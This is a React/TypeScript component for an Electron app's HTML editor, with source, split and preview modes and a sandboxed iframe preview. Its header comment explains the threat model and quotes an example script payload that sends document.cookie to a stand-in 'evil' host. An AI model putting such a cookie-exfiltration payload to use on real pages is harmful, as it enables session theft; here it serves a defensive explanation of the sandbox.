/**
 * HtmlEditor — source / split / preview editor for an HtmlTab.
 *
 * Mirrors MarkdownEditor's three view-modes but renders raw HTML in a sandboxed
 * iframe instead of going through marked. CodeMirror provides HTML syntax
 * highlighting via @codemirror/lang-html.
 *
 * Security: the preview iframe is sandboxed with an empty `sandbox=""` so
 * scripts / forms / same-origin access are all disabled. The editor is for
 * authoring HTML CONTENT (markup, styling), not for testing live web apps —
 * users who want to verify scripts should export and open externally. Without
 * the sandbox, a user could paste an `<script>fetch('https://evil/'+document
 * .cookie)</script>` and have it run inside the Electron renderer with full
 * preload bridge access (window.gendoc.fs.readFile / config.get / etc.) —
 * the renderer DOES have Node integration disabled, but the preload bridge
 * is a Real attack surface this would expose.
 */

import { useEffect, useMemo, useRef, useState } from 'react';
import { EditorState } from '@codemirror/state';
import { EditorView, keymap, lineNumbers, highlightActiveLineGutter } from '@codemirror/view';
import { defaultKeymap, history, historyKeymap, indentWithTab } from '@codemirror/commands';
import { html as htmlLang } from '@codemirror/lang-html';
import { search, searchKeymap } from '@codemirror/search';
import { Code, Columns2, Eye } from 'lucide-react';
import type { HtmlTab } from '../types/tab';
import { useWorkspace } from '../store/workspace';
import { cn, slicePreview } from '../lib/utils';
import { useT } from '../lib/i18n';

type HtmlViewMode = 'source' | 'split' | 'preview';

/**
 * Module-level cache of view-mode preference. Same shape as MarkdownEditor's
 * localStorage-persisted preference — survives tab switches inside the
 * session, plus across app reloads via localStorage.
 */
function loadViewMode(): HtmlViewMode {
  try {
    const v = localStorage.getItem('gendoc.htmlViewMode');
    if (v === 'source' || v === 'split' || v === 'preview') return v;
  } catch {
    /* private mode / quota — fall through to default */
  }
  return 'split';
}

interface Props {
  tab: HtmlTab;
}

export function HtmlEditor({ tab }: Props): JSX.Element {
  const containerRef = useRef<HTMLDivElement>(null);
  const viewRef = useRef<EditorView | null>(null);
  const patchTab = useWorkspace((s) => s.patchTab);
  // R336 — pull setSelection out so the CM6 updateListener can wire the user's
  // highlighted text into the AI-context badge, matching MarkdownEditor's
  // selection-to-context flow. Without this, selecting text inside an HTML
  // tab is a dead-end as far as the AI panel is concerned — the context
  // chip stays empty, and a user who selected a `<table>` snippet and
  // typed「幫我整理這個表」 sends a context-free prompt; the AI has no
  // signal about which slice of the tab the request is about and either
  // answers generically or asks for clarification. Reading the live
  // workspace setter via the same `useWorkspace(s => s.setSelection)`
  // pattern keeps the editor's render-time dependency narrow (no full
  // workspace state subscription).
  const setSelection = useWorkspace((s) => s.setSelection);

  // Echo guard — see MarkdownEditor R275 doc-block. Without this, the
  // [tab.content] effect's view.dispatch echoes back through the
  // updateListener, calling patchTab with the same content the AI / undo
  // just wrote — workspace re-renders, lastEditAt bumps, auto-save timer
  // resets to "ε after AI Apply" instead of "ε after user keystroke".
  const lastPatchedContentRef = useRef<string>(tab.content);

  const [viewMode, setViewMode] = useState<HtmlViewMode>(() => loadViewMode());
  useEffect(() => {
    try {
      localStorage.setItem('gendoc.htmlViewMode', viewMode);
    } catch {
      /* preference just won't persist */
    }
  }, [viewMode]);

  /**
   * Debounced preview srcdoc. The CodeMirror state updates synchronously per
   * keystroke; we only re-feed the iframe at 120ms intervals so a fast typist
   * doesn't cause the iframe to recreate-its-document on every keypress.
   * Identical cadence to MarkdownEditor's marked.parse debounce.
   */
  const [previewSrc, setPreviewSrc] = useState<string>(tab.content);
  useEffect(() => {
    const t = setTimeout(() => setPreviewSrc(tab.content), 120);
    return () => clearTimeout(t);
  }, [tab.content]);

  // Init editor once per mount (keyed by tab.id).
  useEffect(() => {
    if (!containerRef.current) return undefined;

    const updateListener = EditorView.updateListener.of((v) => {
      // R336 — process docChanged and selectionSet independently. A pure
      // mouse-drag selection produces selectionSet=true with docChanged=false;
      // the previous `if (!v.docChanged) return;` early-return discarded
      // every selection-only update, so the AI selection badge stayed
      // empty no matter how much the user highlighted. Mirror Markdown
      // Editor.tsx:436-474's structure: write docChanged → store, then
      // separately route selectionSet → setSelection.
      if (v.docChanged) {
        const newContent = v.state.doc.toString();
        if (newContent !== lastPatchedContentRef.current) {
          lastPatchedContentRef.current = newContent;
          patchTab(tab.id, { content: newContent } as Partial<HtmlTab>);
        }
      }
      if (v.selectionSet) {
        const sel = v.state.selection.main;
        if (!sel.empty) {
          const slice = v.state.doc.sliceString(sel.from, sel.to);
          // R382 — code-point-aware preview via slicePreview helper. See
          // sibling fix in MarkdownEditor.tsx selection handler.
          const preview = slicePreview(slice.replace(/\s+/g, ' '), 60);
          setSelection({
            tabId: tab.id,
            // `[html selection]` prefix matches MarkdownEditor's `[md
            // selection]` convention so AIPanel's badge label stays
            // visually consistent across the two text-format editors.
            preview: `[html selection] ${preview}`,
            text: slice,
            payload: { tabId: tab.id, selectionText: slice },
          });
        } else {
          setSelection(null);
        }
      }
    });

    const state = EditorState.create({
      doc: tab.content,
      extensions: [
        lineNumbers(),
        highlightActiveLineGutter(),
        history(),
        htmlLang({ matchClosingTags: true, autoCloseTags: true }),
        search({ top: true }),
        keymap.of([
          ...defaultKeymap,
          ...historyKeymap,
          ...searchKeymap,
          indentWithTab,
        ]),
        EditorView.lineWrapping,
        updateListener,
      ],
    });
    const view = new EditorView({ state, parent: containerRef.current });
    viewRef.current = view;
    return () => {
      view.destroy();
      viewRef.current = null;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [tab.id]);

  /**
   * Re-import tab.content into the editor when it changes from OUTSIDE (AI
   * Apply / undo / redo). The local updateListener path handles user-typed
   * edits; this branch fires only when the store's tab.content differs from
   * what the editor currently shows.
   */
  useEffect(() => {
    const view = viewRef.current;
    if (!view) return;
    const cur = view.state.doc.toString();
    if (cur === tab.content) return;
    // Pre-arm so the updateListener doesn't echo this programmatic dispatch
    // back as a patchTab → re-render loop.
    lastPatchedContentRef.current = tab.content;
    view.dispatch({
      changes: { from: 0, to: cur.length, insert: tab.content },
    });
  }, [tab.content]);

  const showSource = viewMode !== 'preview';
  const showPreview = viewMode !== 'source';

  // R318 — keep BOTH the source container and the preview iframe always
  // mounted; toggle visibility via the `hidden` Tailwind class (display:none).
  // Conditional rendering would unmount the source <div>, but the
  // EditorView instance — created once in the mount effect with
  // `parent: containerRef.current` — has no public reattach API. After a
  // preview-only round-trip the new <div> is empty and CM6 stays attached
  // to a detached DOM node, leaving the user with a blank, unresponsive
  // editor and no way to recover short of closing/reopening the tab
  // (which also wipes CM6 history). Same shape on the iframe side: each
  // remount creates a fresh browsing context + re-parses the srcDoc, so
  // big HTML flickers and re-renders on every toggle. Always-mounted
  // sidesteps both: the EditorView's parent stays alive, the iframe's
  // browsing context survives, and toggling is a cheap CSS-only update.
  // Width classes are computed from the visible-mode product so the
  // half-half "split" layout still pins both panes at 50% — `hidden`
  // takes the element out of flex layout entirely, which is what we
  // want when one mode is off.
  const sourceClass = showSource
    ? showPreview
      ? 'w-1/2 border-r'
      : 'flex-1'
    : 'hidden';
  const previewClass = showPreview
    ? showSource
      ? 'w-1/2'
      : 'flex-1'
    : 'hidden';

  return (
    <div className="h-full w-full flex flex-col" data-html-editor-root="">
      <HtmlToolbar viewMode={viewMode} onViewModeChange={setViewMode} />
      <div className="flex-1 min-h-0 flex">
        <div
          ref={containerRef}
          className={cn(
            'min-h-0 overflow-hidden font-mono text-sm',
            sourceClass,
          )}
        />
        {/* Sandboxed: no scripts, no same-origin, no top navigation, no
            form submission. The HTML editor is for content/markup
            authoring, not script testing. See file header doc-block for
            the threat model. */}
        <iframe
          sandbox=""
          title={`預覽 ${tab.name}`}
          srcDoc={previewSrc}
          className={cn('min-h-0 bg-white', previewClass)}
        />
      </div>
    </div>
  );
}

interface ToolbarProps {
  viewMode: HtmlViewMode;
  onViewModeChange(m: HtmlViewMode): void;
}

function HtmlToolbar({ viewMode, onViewModeChange }: ToolbarProps): JSX.Element {
  const t = useT();
  const modes = useMemo<Array<{ mode: HtmlViewMode; label: string; Icon: React.ComponentType<{ className?: string }>; title: string }>>(
    () => [
      { mode: 'source', label: t('原始碼', 'Source'), Icon: Code, title: t('只看原始碼（Code mode）', 'Source only (Code mode)') },
      { mode: 'split', label: t('對照', 'Split'), Icon: Columns2, title: t('左右對照（原始碼 + 預覽）', 'Side-by-side (source + preview)') },
      { mode: 'preview', label: t('預覽', 'Preview'), Icon: Eye, title: t('只看預覽（成品檢視）', 'Preview only (final view)') },
    ],
    [t],
  );
  return (
    <div className="flex items-center gap-1 px-2 py-1 border-b bg-background/80">
      <div className="text-xs text-muted-foreground mr-2">HTML</div>
      <div className="ml-auto inline-flex rounded-md border bg-background overflow-hidden">
        {modes.map(({ mode, label, Icon, title }) => (
          <button
            key={mode}
            type="button"
            onClick={() => onViewModeChange(mode)}
            title={title}
            aria-pressed={viewMode === mode}
            className={cn(
              'inline-flex items-center gap-1 px-2 py-1 text-xs transition-colors',
              viewMode === mode
                ? 'bg-secondary text-foreground'
                : 'text-muted-foreground hover:bg-secondary/60',
            )}
          >
            <Icon className="h-3.5 w-3.5" />
            {label}
          </button>
        ))}
      </div>
    </div>
  );
}
